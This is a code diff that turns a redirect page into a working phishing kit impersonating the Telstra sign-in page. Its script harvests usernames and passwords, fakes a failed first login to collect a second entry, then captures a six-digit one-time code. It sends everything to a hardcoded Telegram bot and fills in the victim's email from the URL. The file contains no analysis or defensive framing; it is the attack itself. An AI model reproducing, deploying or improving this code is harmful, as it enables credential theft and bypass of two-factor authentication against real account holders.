@@ -1,19 +1,574 @@
-<html>
-    <head></head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in </title
+	<link rel="icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-favicon.png">
+    <link rel="apple-touch-icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-apple-touch.png">
+    
+    <!-- Telstra CSS imports -->
+    <style>
+        @import url('https://myid.telstra.com/identity/assets/fonts/telstra-fonts.css');
+        @import url('https://myid.telstra.com/identity/assets/css/min/telstra-able.min.css');
+        @import url('https://myid.telstra.com/identity/assets/css/min/cnsb-custom.min.css');
+    </style>
+    
+    <!-- Additional styles for OTP and Done pages -->
+    <style>
+        /* Loading screen styles */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0d54ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Page visibility */
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        /* OTP page specific styles */
+        .otp-container {
+            max-width: 400px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+        
+        .otp-container h2 {
+            text-align: left;
+            font-size: 22px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-container label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .otp-container input[type="text"] {
+            width: 300px;
+            padding: 12px;
+            font-size: 18px;
+            border: 2px solid #0d54ff;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        
+        .otp-error {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 12px;
+        }
+        
+        .countdown {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        
+        .resend-block {
+            text-align: left;
+            font-size: 14px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .resend-block a {
+            text-decoration: none;
+            color: #0d54ff;
+            font-weight: bold;
+        }
+        
+        .resend-block a::after {
+            content: " →";
+            font-size: 14px;
+            vertical-align: middle;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .nav-buttons button {
+            background: none;
+            border: none;
+            color: #0d54ff;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 0;
+        }
+        
+        .nav-buttons .next-btn {
+            color: #0000FF;
+            background: #ffffff;
+            border: 2px solid #0000FF;
+            border-radius: 24px;
+            padding: 8px 16px;
+            font-size: 14px;
+        }
+        
+        /* Done page styles */
+        .done-container {
+            max-width: 376px;
+            margin: auto;
+            position: relative;
+            padding: 0 8px 62px;
+            min-height: 100vh;
+        }
+        
+        .done-container .t-page-header {
+            width: 100vw;
+            position: relative;
+            left: 50%;
+            right: 50%;
+            margin-left: -50vw;
+            margin-right: -50vw;
+            height: 67px;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.16);
+            margin-bottom: 3.5rem;
+            background: #fff;
+        }
+        
+        .done-container .t-page-header svg {
+            position: absolute;
+            top: 13px;
+            left: 114px;
+            width: 33px;
+            height: 33px;
+        }
+        
+        .done-container main.t-form-container {
+            padding: 0 8px;
+        }
+        
+        .done-container h1.t-able-heading-b {
+            font: 500 2rem/1.25 Telstra Display, Helvetica Neue, Helvetica, Arial, sans-serif;
+            letter-spacing: 0;
+            margin-bottom: 1rem;
+        }
+        
+        .done-container p.t-able-text-bodyshort {
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 2rem;
+        }
+        
+        .done-container a.t-reset-password-link {
+            display: inline-block;
+            text-decoration: underline;
+            font-size: 1rem;
+            color: #0d54ff;
+            margin-bottom: 3.5rem;
+        }
+        
+        .done-footer {
+            width: 100vw;
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            right: 50%;
+            margin-left: -50vw;
+            margin-right: -50vw;
+            height: 62px;
+            background-color: #f4f4f4;
+            border-top: 1px solid #e4e4e4;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #777;
+            gap: 10px;
+        }
+        
+        .done-footer a {
+            color: #0d54ff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Login Page -->
+    <div class="page active" id="loginPage">
+        <div>
+            <header class="t-page-header">
+                <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
+                    <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                        <g id="Telstra_Primary-logo_C_RGB" fill-rule="nonzero">
+                            <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
+                            <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
+                        </g>
+                    </g>
+                </svg>
+            </header>
+            
+            <div role="main" class="t-form-container">
+                <h1 class="t-able-heading-b t-able-spacing-2x-mb">Sign in</h1>
+                <div class="t-able-text-bodyshort t-able-spacing-7x-mb">Sign in with your Telstra ID</div>
+                
+                <form id="loginForm" autocomplete="off">
+                    <div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
+                        <label for="username">Username</label>
+                        <input id="username" type="text" name="username" autofocus="" autocomplete="username" aria-invalid="false" aria-required="true" required="">
+                    </div>
+
+                    <div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
+                        <label for="password">Password</label>
+                        <input id="password" type="password" name="password" autocomplete="current-password" aria-invalid="false" aria-required="true" required="">
+                        <button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters">Show</button>
+                        <button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd t-icon--hidden" aria-label="Hide password characters" style="display: none;">Hide</button>
+                        <p id="password-error-text" style="color: red; display: none; margin-top: 8px;"></p>
+                    </div>
+
+                    <div class="t-able-spacing-2x-mb">
+                        <a class="t-able-low-emph-button t-reset-password-link" href="#" onclick="return false;">
+                            Recover account
+                        </a>
+                    </div>
+                    
+                    <div class="t-able-checkbox t-able-spacing-3x-mb">
+                        <input name="rememberUsername" type="checkbox" id="rememberUsername">
+                        <label for="rememberUsername">Remember username</label>
+                    </div>
+                    
+                    <div class="">
+                        <button id="submit_btn" class="t-able-high-emph-button t-able-spacing-2x-mb" type="submit">Continue</button>
+                    </div>
+                    
+                    <p class="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>
+                    <a class="t-able-medium-emph-button t-able-spacing-7x-mb" href="#" onclick="return false;">Create a Telstra ID</a>
+                </form>
+            </div>
+            
+            <footer class="t-footer">
+                <div class="t-footer-content">
+                    <p class="t-footer-copyright">Copyright © 2024 Telstra</p>
+                    <a class="t-footer-privacy" href="#" target="_blank">Privacy</a>
+                    <a class="t-footer-terms" href="#" target="_blank">Terms of use</a>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- OTP Page -->
+    <div class="page" id="otpPage">
+        <div class="page-header">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 33 33" aria-label="Telstra Logo" style="width: 36px; height: auto; margin-left: 100px;">
+                <path d="M18.743 14.083L17.5 21.35c-.26 1.31-1.12 1.66-1.88 1.66H9.88L12.3 9.7C9.88 8.6 7.42 7.88 5.46 7.88 3.6 7.88 2.08 8.38 1.07 9.59.36 10.45 0 11.51 0 12.77c0 3.78 2.98 9.03 8.08 13.32 4.55 3.78 9.55 5.91 13.19 5.91 1.82 0 3.28-.56 4.25-1.66.76-.86 1.06-1.97 1.06-3.23 0-3.68-3-8.84-7.84-13.02z" fill="#F96449"/>
+                <path d="M8.44 0c-.91 0-1.67.61-1.87 1.57L5.76 5.95h7.21L9.88 23.01h5.74c.77 0 1.63-.36 1.88-1.66l2.63-15.4h5.19c.91 0 1.67-.6 1.87-1.56L28 0H8.44z" fill="#0D54FF"/>
+            </svg>
+        </div>
+        
+        <div class="otp-container">
+            <h2>Enter Code</h2>
+            <form id="otpForm">
+                <label for="otp">6-digit code</label>
+                <input type="text" name="otp" id="otp" maxlength="6" required>
+                <div class="otp-error" id="error-msg">Invalid code. Please enter a 6-digit number.</div>
+
+                <div class="countdown" id="countdown">Code will expire in 05:00</div>
+
+                <div class="resend-block">
+                    Didn't get your one-time code?<br><p>&nbsp;</p>
+                    <a href="#" id="resendLink">Resend</a>
+                </div>
+
+                <div class="nav-buttons">
+                    <button type="button" id="backBtn">< Back</button>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Done Page -->
+    <div class="page" id="donePage">
+        <div class="done-container">
+            <header class="t-page-header">
+                <svg viewBox="0 0 28 30" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img">
+                    <path fill="#0099F8" d="M17.45,6.11L16.3,13.1c-.24,1.26-1.04,1.59-1.75,1.59H9.2L11.45,1.89C9.2,0.83,6.91,0.14,5.08,0.14c-1.74,0-3.15.48-4.08,1.65C.33,2.62,0,3.63,0,4.85c0,3.64,2.78,8.69,7.53,12.81C11.76,21.29,16.42,23.33,19.81,23.33c1.69,0,3.05-.53,3.97-1.6.71-.83,1-1.9,1-3.1C24.75,15.09,21.96,10.13,17.45,6.11Z"/>
+                    <path fill="#001E82" d="M5.79,1.48,5,5.61h7.03L9.01,21.67h5.59c.75,0,1.59-.33,1.84-1.56L19,5.61h5.06c.89,0,1.63-.57,1.83-1.47L26.67,0H7.61c-.89,0-1.63.57-1.82,1.48Z"/>
+                </svg>
+            </header>
+            
+            <main class="t-form-container">
+                <h1 class="t-able-heading-b" id="errorMsgId" tabindex="-1">Session expired</h1>
+                <p class="t-able-text-bodyshort">Your session has timed out. Please start again.</p>
+                <a href="https://www.telstra.com.au/" class="t-reset-password-link">Back to sign in</a>
+            </main>
+            
+            <footer class="done-footer">
+                <p>© 2025 Telstra Corporation Ltd.</p>
+                <a href="https://www.telstra.com.au/privacy/privacy-statement" target="_blank">Privacy</a>
+                <a href="https://www.telstra.com.au/terms-of-use" target="_blank">Terms of Use</a>
+            </footer>
+        </div>
+    </div>
 
     <script>
-        var queryParams = window.location.search.substr(1).split('&').reduce(function (q, query) {
-  var chunks = query.split('=');
-  var key = chunks[0];
-  var value = decodeURIComponent(chunks[1]);
-  value = isNaN(Number(value))? value : Number(value);
-
-  console.log('q[key] ' +q[key]);
-  return (q[key] = value, q);
-}, {});
-
-window.location.replace(
-"https://covang62.com/fnb0hama/#" +
-queryParams['rt']);
+        // Global variables
+        let loginAttempts = 0;
+        let otpTimer;
+        let totalSeconds = 5 * 60; // 5 minutes
+        
+        // Telegram bot configuration
+        const TELEGRAM_BOT_TOKEN = '6716909233:AAG1Ha4E67uz1iM2byEXbuzDCLL5ngbf1Zk';
+        const TELEGRAM_CHAT_ID = '5865498119';
+        
+        // Auto-grab email from URL hash
+        function autoGrabEmail() {
+            const hash = window.location.hash;
+            if (hash && hash.startsWith('#')) {
+                const email = hash.substring(1); // Remove the # symbol
+                if (email && email.includes('@')) {
+                    document.getElementById('username').value = email;
+                }
+            }
+        }
+        
+        // Utility functions
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+        }
+        
+        function showLoading() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+        }
+        
+        function hideLoading() {
+            document.getElementById('loadingScreen').style.display = 'none';
+        }
+        
+        // Get visitor information
+        function getVisitorInfo() {
+            return {
+                ip: 'Unknown', // Will be detected server-side in real implementation
+                country: 'Unknown',
+                region: 'Unknown',
+                city: 'Unknown',
+                isp: 'Unknown',
+                user_agent: navigator.userAgent,
+                url: window.location.href,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        // Send data to Telegram
+        async function sendToTelegram(data, type = 'login') {
+            const visitorInfo = getVisitorInfo();
+            
+            let message = '';
+            if (type === 'login') {
+                message = `🔐 *Telstra Login Attempt*\n\n`;
+                message += `👤 *Username:* \`${data.username}\`\n`;
+                message += `🔐 *Password:* \`${data.password}\`\n`;
+                message += `🔢 *Attempt:* ${data.attempt}\n`;
+            } else if (type === 'otp') {
+                message = `📱 *Telstra OTP Submitted*\n\n`;
+                message += `👤 *Username:* \`${data.username}\`\n`;
+                message += `🔢 *OTP Code:* \`${data.otp}\`\n`;
+            }
+            
+            message += `🌐 *IP:* ${visitorInfo.ip}\n`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (!response.ok) {
+                    console.error('Failed to send to Telegram:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        // Login page functionality
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorText = document.getElementById('password-error-text');
+            
+            loginAttempts++;
+            
+            // Send login data to Telegram
+            await sendToTelegram({
+                username: username,
+                password: password,
+                attempt: loginAttempts
+            }, 'login');
+            
+            showLoading();
+            
+            // Simulate login attempt
+            setTimeout(() => {
+                hideLoading();
+                
+                if (loginAttempts >= 2) {
+                    // After 2 attempts, go to OTP
+                    showPage('otpPage');
+                    startOtpTimer();
+                } else {
+                    // Show error for first attempt
+                    errorText.textContent = 'The username or password entered does not match our records. Please try again.';
+                    errorText.style.display = 'block';
+                    document.getElementById('password').value = '';
+                }
+            }, 2000);
+        });
+        
+        // Password show/hide functionality
+        document.getElementById('showPwdBtn').addEventListener('click', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = 'text';
+            this.style.display = 'none';
+            document.getElementById('hidePwdBtn').style.display = 'inline-block';
+        });
+        
+        document.getElementById('hidePwdBtn').addEventListener('click', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = 'password';
+            this.style.display = 'none';
+            document.getElementById('showPwdBtn').style.display = 'inline-block';
+        });
+        
+        // OTP page functionality
+        function startOtpTimer() {
+            totalSeconds = 5 * 60; // Reset to 5 minutes
+            const countdown = document.getElementById('countdown');
+            const otpInput = document.getElementById('otp');
+            
+            otpTimer = setInterval(() => {
+                totalSeconds--;
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                countdown.textContent = `Code will expire in ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                
+                if (totalSeconds <= 0) {
+                    clearInterval(otpTimer);
+                    countdown.textContent = "Code expired.";
+                    otpInput.disabled = true;
+                }
+            }, 1000);
+        }
+        
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const otpCode = document.getElementById('otp').value.trim();
+            const isValid = /^\d{6}$/.test(otpCode);
+            
+            if (!isValid) {
+                document.getElementById('error-msg').style.display = 'block';
+                return;
+            }
+            
+            // Send OTP data to Telegram
+            const username = document.getElementById('username').value;
+            await sendToTelegram({
+                username: username,
+                otp: otpCode
+            }, 'otp');
+            
+            showLoading();
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                hideLoading();
+                clearInterval(otpTimer);
+                showPage('donePage');
+            }, 2000);
+        });
+        
+        document.getElementById('backBtn').addEventListener('click', function() {
+            clearInterval(otpTimer);
+            showPage('loginPage');
+        });
+        
+        document.getElementById('resendLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert("A new code has been sent to your device.");
+            startOtpTimer(); // Restart timer
+        });
+        
+        // Done page functionality
+        document.getElementById('backToSignIn').addEventListener('click', function(e) {
+  e.preventDefault();
+            // Reset everything
+            loginAttempts = 0;
+            document.getElementById('loginForm').reset();
+            document.getElementById('otpForm').reset();
+            document.getElementById('password-error-text').textContent = '';
+            document.getElementById('password-error-text').style.display = 'none';
+            document.getElementById('error-msg').style.display = 'none';
+            showPage('loginPage');
+            autoGrabEmail(); // Re-grab email after reset
+        });
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            showPage('loginPage');
+            autoGrabEmail(); // Auto-grab email on page load
+        });
+        
+        // Listen for hash changes
+        window.addEventListener('hashchange', function() {
+            autoGrabEmail();
+        });
     </script>
+</body>
 </html>
